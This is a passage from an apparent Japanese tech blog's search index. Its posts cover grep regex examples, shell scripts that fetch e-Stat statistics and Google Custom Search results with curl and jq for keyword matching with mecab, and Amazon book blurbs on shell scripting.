+8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep 1212$ 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント customers.txtファイルには「1212」で終わる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。 連結との一致 正規表現パターンは、複数のパターンを連結することで作成できます。\nドット（.）は、パターンを連結するために使用されます。\nこの例では、 Customers.txtファイルに対して「grep」コマンドと連結して使用する方法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -e '[MR]\\.\\*[Kk]' 23 Riya Chakroborti riya@gmail.com +8801937864534 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント customers.txtファイルには「R」と「M 」で始まり「 k 」で終わる2行が存在します。したがって、ファイルの3行目と6行目が出力に出力されています。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-24T10:53:58+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep_hu5909208fb16d2109d0cdca2186f9358e_30103_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/","title":"【grep特集】ざっくりわかるシェルスクリプト４"},{"content":"Google Custom Search APIの検索結果と統計名の列名をマッチンングさせる 今回は、前回取得したGoogle Custom Search APIの検索結果と統計名の列名をマッチンングさせて社会的に関心の高い列名を取得してみたいと思います。\n今回は「人権侵犯事件統計」 を取り扱ってみたいと思います。\n人権侵犯事件統は、法務省の人権擁護機関で取り扱った人権侵犯事件及び人権相談に関する統計報告を集計したものとのことです。\ne-Stat から統計データを取得する まずはe-StatのAPIにアクセスして統計データを取得します。\n将来的には新着の統計データを日時で取得して処理するようにしますが、今回は「人権侵犯事件統計」だけ取得します。\ncurl -s \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxxxxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003286680\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -o \u0026#34;$STCSV\u0026#34; 統計データの中身を見てみる \u0026#34;RESULT\u0026#34; \u0026#34;STATUS\u0026#34;,\u0026#34;0\u0026#34; \u0026#34;ERROR_MSG\u0026#34;,\u0026#34;正常に終了しました。\u0026#34; \u0026#34;DATE\u0026#34;,\u0026#34;2022-01-21T09:58:51.856+09:00\u0026#34; \u0026#34;RESULT_INF\u0026#34; \u0026#34;TOTAL_NUMBER\u0026#34;,\u0026#34;403425\u0026#34; \u0026#34;FROM_NUMBER\u0026#34;,\u0026#34;1\u0026#34; \u0026#34;TO_NUMBER\u0026#34;,\u0026#34;100000\u0026#34; \u0026#34;NEXT_KEY\u0026#34;,\u0026#34;100001\u0026#34; \u0026#34;TABLE_INF\u0026#34;,\u0026#34;0003286680\u0026#34; \u0026#34;STAT_NAME\u0026#34;,\u0026#34;00250010\u0026#34;,\u0026#34;人権侵犯事件統計\u0026#34; \u0026#34;GOV_ORG\u0026#34;,\u0026#34;00250\u0026#34;,\u0026#34;法務省\u0026#34; \u0026#34;STATISTICS_NAME\u0026#34;,\u0026#34;人権侵犯事件統計\u0026#34; \u0026#34;TITLE\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;人権侵犯事件 種類別　人権侵犯事件の受理及び 処理件数　（月次）\u0026#34; \u0026#34;CYCLE\u0026#34;,\u0026#34;月次\u0026#34; \u0026#34;SURVEY_DATE\u0026#34;,\u0026#34;201801\u0026#34; \u0026#34;OPEN_DATE\u0026#34;,\u0026#34;2022-01-20\u0026#34; \u0026#34;SMALL_AREA\u0026#34;,\u0026#34;0\u0026#34; \u0026#34;COLLECT_AREA\u0026#34;,\u0026#34;該当なし\u0026#34; \u0026#34;MAIN_CATEGORY\u0026#34;,\u0026#34;14\u0026#34;,\u0026#34;司法・安全・環境\u0026#34; \u0026#34;SUB_CATEGORY\u0026#34;,\u0026#34;01\u0026#34;,\u0026#34;司法\u0026#34; \u0026#34;OVERALL_TOTAL_NUMBER\u0026#34;,\u0026#34;0\u0026#34; \u0026#34;UPDATED_DATE\u0026#34;,\u0026#34;2022-01-20\u0026#34; \u0026#34;STATISTICS_NAME_SPEC\u0026#34;,\u0026#34;人権侵犯事件統計\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;TITLE_SPEC\u0026#34;,\u0026#34;人権侵犯事件\u0026#34;,\u0026#34;種類別　人権侵犯事件の受理 及び処理件数　（月次）\u0026#34;,\u0026#34;処理の合計件数と，その内訳であ る措置，措置猶予，侵犯事実不存在，侵犯事実不明確，打切\u0026gt;り，中止，移送及び啓発の各件数の合計とが一致しない場合\u0026gt;があるのは，１つの事件につき複数の措置を採る場合がある\u0026gt;こと等による。\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;VALUE\u0026#34; \u0026#34;tab_code\u0026#34;,\u0026#34;表章項目\u0026#34;,\u0026#34;cat01_code\u0026#34;,\u0026#34;人権侵犯事件の受理\u0026gt;・処理別\u0026#34;,\u0026#34;cat02_code\u0026#34;,\u0026#34;人権侵犯事件の種類別\u0026#34;,\u0026#34;time_code\u0026#34;,\u0026#34;時間軸(月次)\u0026#34;,\u0026#34;unit\u0026#34;,\u0026#34;value\u0026#34;,\u0026#34;annotation\u0026#34; \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;2021001111\u0026#34;,\u0026#34;2021年11月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;1430\u0026#34;,\u0026#34;\u0026#34; \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;2021001010\u0026#34;,\u0026#34;2021年10月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;1329\u0026#34;,\u0026#34;\u0026#34; データの中身を見てみると\u0026quot;VALUE\u0026quot;から上がヘッダー的な項目で、データは\u0026quot;VALUE\u0026quot;以下にありそうです。\nVALUE より上の行を削除しましょう。\nsed でマッチした行より上を削除する方法ががあると良いのですがわからないのでgrepと組み合わせます。\ngrep -n でマッチした行数を取得できます。\nsed -e \u0026ldquo;1,26d\u0026rdquo; で1行目から26行目までを削除できます\n\u0026#34;tab_code\u0026#34;,\u0026#34;表章項目\u0026#34;,\u0026#34;cat01_code\u0026#34;,\u0026#34;人権侵犯事件の受理・処理別\u0026#34;,\u0026#34;cat02_code\u0026#34;,\u0026#34;人権侵犯事件の種類別\u0026#34;,\u0026#34;time_code\u0026#34;,\u0026#34;時間軸(月次)\u0026#34;,\u0026#34;unit\u0026#34;,\u0026#34;value\u0026#34;,\u0026#34;annotation\u0026#34; \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;2007000101\u0026#34;,\u0026#34;2007年1月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;2170\u0026#34;,\u0026#34;\u0026#34; . . \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;130\u0026#34;,\u0026#34;私人等に関するもの\u0026#34;,\u0026#34;2021001111\u0026#34;,\u0026#34;2021年11月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;1230\u0026#34;,\u0026#34;\u0026#34; VALUE以下の内容を見てみると「_code」はコードが入るだけなので無視して良さそうです。\n表章項目も「件数」しかないので無視して良さそうです。\n時間軸、unite、value、annotationもいらなそうです。\n「人権侵犯事件の受理・処理別」は\n\u0026#34;旧受\u0026#34; \u0026#34;総数\u0026#34; \u0026#34;新受_計\u0026#34; \u0026#34;新受_申告_委員受\u0026#34; \u0026#34;新受_申告_職員受\u0026#34; \u0026#34;新受_人権擁護委員の通報\u0026#34; \u0026#34;新受_関係行政機関の通報\u0026#34; \u0026#34;人権侵犯事件の受理・処理別\u0026#34; これは一旦は総数だけ使えば良さそうです\n「人権侵犯事件の種類別」は\n\u0026#34;総数\u0026#34; \u0026#34;私人等に関するもの\u0026#34; \u0026#34;私人等に関するもの_売春\u0026#34; \u0026#34;私人等に関するもの_その他\u0026#34; \u0026#34;私人等に関するもの_村八分\u0026#34; \u0026#34;私人等に関するもの_交通事故\u0026#34; \u0026#34;私人等に関するもの_人身売買\u0026#34; . . . 人権侵犯事件の種類が並べられています。この部分から社会的関心の高いものを抽出できると良さそうですね。\n抽出対象の列をどこにするのかも将来的に自動化したいのですが今回は固定で「人権侵犯事件の種類別」の列を抽出対象にしたいと思います。\nmecabを使ってマッチングキーワードを最適化する cat \u0026#34;$STCSV\u0026#34;|$SED -e \u0026#34;1,$((vnum+1))d\u0026#34;|$AWK -F, \u0026#39;{print $6;}\u0026#39;|sed -e \u0026#34;s|\\\u0026#34;||g\u0026#34;|sort|uniq; \u0026#34;私人等に関するもの_売春\u0026#34; \u0026#34;私人等に関するもの_その他\u0026#34; \u0026#34;私人等に関するもの_村八分\u0026#34; \u0026#34;私人等に関するもの_交通事故\u0026#34; \u0026#34;私人等に関するもの_人身売買\u0026#34; \u0026#34;私人等に関するもの_医療関係\u0026#34; \u0026#34;私人等に関するもの_私的制裁\u0026#34; \u0026#34;私人等に関するもの_差別待遇_女性\u0026#34; \u0026#34;私人等に関するもの_差別待遇_その他\u0026#34; \u0026#34;私人等に関するもの_差別待遇_外国人\u0026#34; \u0026#34;私人等に関するもの_差別待遇_性自認\u0026#34; 「私人等に関するもの_交通事故」という文字列はニュースなどではそのまま使われないでしょうからそのままgoogle custom search の検索結果にマッチングをかけてもダメそうです。\nmecab を使って文字列を分解してマッチングをかけたいと思います。\nmecabはオープンソースの形態素解析エンジンです入力した文字列を構文解析してくれます。\necho \u0026#34;私人等に関するもの_差別待遇_女性\u0026#34;|mecab 私人\t名詞,一般,*,*,*,*,私人,シジン,シジン 等\t名詞,接尾,一般,*,*,*,等,トウ,トー に関する\t助詞,格助詞,連語,*,*,*,に関する,ニカンスル,ニカンスル も\t助詞,係助詞,*,*,*,*,も,モ,モ の\t助詞,連体化,*,*,*,*,の,ノ,ノ _\t名詞,サ変接続,*,*,*,*,* 差別\t名詞,サ変接続,*,*,*,*,差別,サベツ,サベツ 待遇\t名詞,サ変接続,*,*,*,*,待遇,タイグウ,タイグー _\t名詞,サ変接続,*,*,*,*,* 女性\t名詞,一般,*,*,*,*,女性,ジョセイ,ジョセイ EOS 取り出すのは名詞だけで良さそうですし、名詞でも1文字だけのものは除外したほうが良さそうですね\necho \u0026#34;私人等に関するもの_差別待遇_女性\u0026#34;|mecab|grep \u0026#34;名詞\u0026#34;|awk \u0026#39;{print $1;}\u0026#39;|grep -v ^.$ 私人 差別 待遇 女性 マッチングしてみる このキーワードでgoogle custom search の検索結果にマッチングをかけカウント数を取得して見ましょう。\n11,私人等に関するもの_強制・強要_家族間のもの_親の子に対するもの 11,私人等に関するもの_社会福祉施設関係_施設職員によるもの 14,私人等に関するもの_差別待遇_同和問題（うち公務員によるもの） 18,私人等に関するもの_社会福祉施設関係_施設職員によるもの（うち公営の施設に従事する職員によるもの） 19,私人等に関するもの_プライバシー関係_インターネット（うち同和問題に関する侵犯） インターネットがマッチしたのは良いのですが「同和問題」の中の「問題」の部分でカウント数を稼いでしまって思うような感じにはなりません。\n「もの」とかもカウント数を稼いでいるので汎用的なキーワードを除外する処理を入れる必要がありそうです。\n自動化の道のりは遠いですね。\nプログラム function getStatistics(){ : #curl -s \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=$ESID\u0026amp;lang=J\u0026amp;statsDataId=0003286680\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -o \u0026#34;$STCSV\u0026#34; } function matchGcs(){ #VALUEより上の行を削除する vnum=$(cat \u0026#34;$STCSV\u0026#34;|grep -n \u0026#34;VALUE\u0026#34;|$AWK -F: \u0026#39;{print $1;}\u0026#39;) echo \u0026#34;$vnum\u0026#34; cat \u0026#34;$STCSV\u0026#34;|$SED -e \u0026#34;1,$((vnum+1))d\u0026#34;|$AWK -F, \u0026#39;{print $6;}\u0026#39;|$SED -e \u0026#34;s|\\\u0026#34;||g\u0026#34;|sort|uniq|while read line;do local mcnt=$(echo \u0026#34;$line\u0026#34;|mecab|grep \u0026#34;名詞\u0026#34;|awk \u0026#39;{print $1;}\u0026#39;|grep -v -e ^.$|while read word;do cat \u0026#34;$GCSCSV\u0026#34;|grep \u0026#34;$word\u0026#34;|wc -l done| awk \u0026#39;{sum+=$0} END{print sum;}\u0026#39;); echo \u0026#34;$mcnt,$line\u0026#34; done|sort|uniq|sort -n } function main(){ #統計名でgoogle cloud searchを検索する getGcs;\u0026lt;---前回作成したもの #統計データを取得する getStatistics; #統計データの列情報とgoogle cloud searchの検索結果をマッチングする matchGcs; } main; exit; 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-21T13:50:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（４）"},{"content":"google Custom Searchの検索結果をcsvに整形する 統計データから列名を取得してgoogle Custom Searchの検索結果に当てに行きマッチする回数の高い列名を社会的関心の高い項目に設定したいと思います。\n全開でgoogle Custom Searchの検索の絞り込みができたのでAPIを叩く回数は統計名ごとに3回にしたいと思います。\nstart パラメータを1から開始して10ずつインクリメントしていきます。\ncurl -s \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx\u0026amp;cx=xxxxxx\u0026amp;q=人権侵犯事件統計\u0026amp;start=1\u0026#39; curl -s \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx\u0026amp;cx=xxxxxx\u0026amp;q=人権侵犯事件統計\u0026amp;start=11\u0026#39; curl -s \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx\u0026amp;cx=xxxxxx\u0026amp;q=人権侵犯事件統計\u0026amp;start=21\u0026#39; 3回APIを叩いた結果に対してマッチングをかけていきたいと思うのですが、google Custom Searchの検索結果を見やすくするため前準備としてcsvに整形したいと思います。\ngoogle Custom Searchの検索結果はjsonですがjsonのパースはjqを使います。\njqのインストール jqのインストールは簡単です。\nbrew install jq jqを使ってgoogle Custom Searchの検索結果をjsonをパースする \u0026#34;items\u0026#34;: [ ¦ { ¦ ¦ \u0026#34;kind\u0026#34;: \u0026#34;customsearch#result\u0026#34;, ¦ ¦ \u0026#34;title\u0026#34;: \u0026#34;昨年の人権侵犯事件 いじめ、教員関係が半減 | 教育新聞\u0026#34;, ¦ ¦ \u0026#34;htmlTitle\u0026#34;: \u0026#34;昨年の\\u003cb\\u003e人権侵犯事件\\u003c/b\\u003e いじめ、教員関係が半減 | 教育新聞\u0026#34;, ¦ ¦ \u0026#34;link\u0026#34;: \u0026#34;https://www.kyobun.co.jp/news/20210323_03/\u0026#34;, ¦ ¦ \u0026#34;displayLink\u0026#34;: \u0026#34;www.kyobun.co.jp\u0026#34;, ¦ ¦ \u0026#34;snippet\u0026#34;: \u0026#34;2021/03/23 ... それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した人権侵犯事件は9589件で、前年よりも5831件減少。同省の担当者は「他の統計 ...\u0026#34;, ¦ ¦ \u0026#34;htmlSnippet\u0026#34;: \u0026#34;2021/03/23 \\u003cb\\u003e...\\u003c/b\\u003e それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した\\u003cb\\u003e人権侵犯事件\\u003c/b\\u003eは9589件で、前年よりも5831件減少。同省の担当者は「他の\\u003cb\\u003e統計\\u003c/b\\u003e\u0026amp;nbsp;...\u0026#34;, items配列の中に検索結果が保存されているみたいです。\n取得する項目は、title、snippet、linkにします。\njqでカウントを取得する方法は length です。\njq \u0026#39;.items | length\u0026#39; 配列以下の要素の取り方は\njq -r .items[0].title です。\n返却結果にダブルクォーテーションが入るのが邪魔なのでオプション -r をつけています。\nプログラムの内容、出力結果 プログラムは以下となります\n#!/bin/bash #グーグルカスタムサーチの結果を取得します APKEY=\u0026#34;xxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34;; EGID=\u0026#34;xxxxxxxxxxxx\u0026#34;; START=1; STATISTICS=\u0026#34;$1\u0026#34;; AWK=`which gawk`; SED=`which gsed`; TMP=\u0026#34;gcstmp.json\u0026#34; RST=\u0026#34;gcsrst.csv\u0026#34;; cnt=0; function parse(){ items=$(cat \u0026#34;$TMP\u0026#34;|jq .items); length=$(echo \u0026#34;$items\u0026#34;|jq \u0026#39;.| length\u0026#39;); pcnt=0; while :;do if [ \u0026#34;$pcnt\u0026#34; -ge \u0026#34;$length\u0026#34; ];then break; fi item=$(echo \u0026#34;$items\u0026#34;|jq .[$pcnt]); title=$(echo \u0026#34;$item\u0026#34;|jq -r .title); snippet=$(echo \u0026#34;$item\u0026#34;|jq -r .snippet); link=$(echo \u0026#34;$item\u0026#34;|jq -r .link); echo \u0026#34;$title,$snippet,$link\u0026#34;|tee -a \u0026#34;$RST\u0026#34;; pcnt=$((pcnt+1)); done } function main(){ :\u0026gt;\u0026#34;$RST\u0026#34;; while :;do if [ \u0026#34;$cnt\u0026#34; -ge 3 ];then break; fi st=$((cnt*10+1)) curl \u0026#34;https://www.googleapis.com/customsearch/v1?key=$APKEY\u0026amp;cx=$EGID\u0026amp;q=$STATISTICS\u0026amp;start=$st\u0026#34; -o $TMP parse; cnt=$((cnt+1)); done } main; exit; 整形した検索結果は以下のようになります\n昨年の人権侵犯事件 いじめ、教員関係が半減 | 教育新聞,2021/03/23 ... それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した人権侵犯事件は9589件で、前年よりも5831件減少。同省の担当者は「他の統計 ...,https://www.kyobun.co.jp/news/20210323_03/ 難民とLGBT：世界における人権侵害の状況 | 難民研究フォーラム ...,2020/12/24 ... マッピング. 2019年末現在、「LGBTであること」や「同性間の性行為」などを刑法において犯罪としている国をマッピング ...,https://refugeestudies.jp/2020/12/lgbt/ 人権擁護委員 - Wikipedia,全国の人権擁護委員の2011年（平成23年）中の活動実績は、次のとおりである。 人権啓発活動従事回数 - 227,683回; 人権相談事件取扱件数 - 159,157件; 人権侵犯事件関与 ...,https://ja.wikipedia.org/wiki/%E4%BA%BA%E6%A8%A9%E6%93%81%E8%AD%B7%E5%A7%94%E5%93%A1 法務省：インターネットによる人権侵害をなくしましょう – Gov base,2021/04/30 ... ※プロバイダ責任制限法等については、後述の「参考」をご覧ください。 インターネットに関する人権侵犯事件の新規救済手続開始件数. 法務省の人権擁護機関 ...,https://www.gov-base.info/2021/04/30/112474 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! 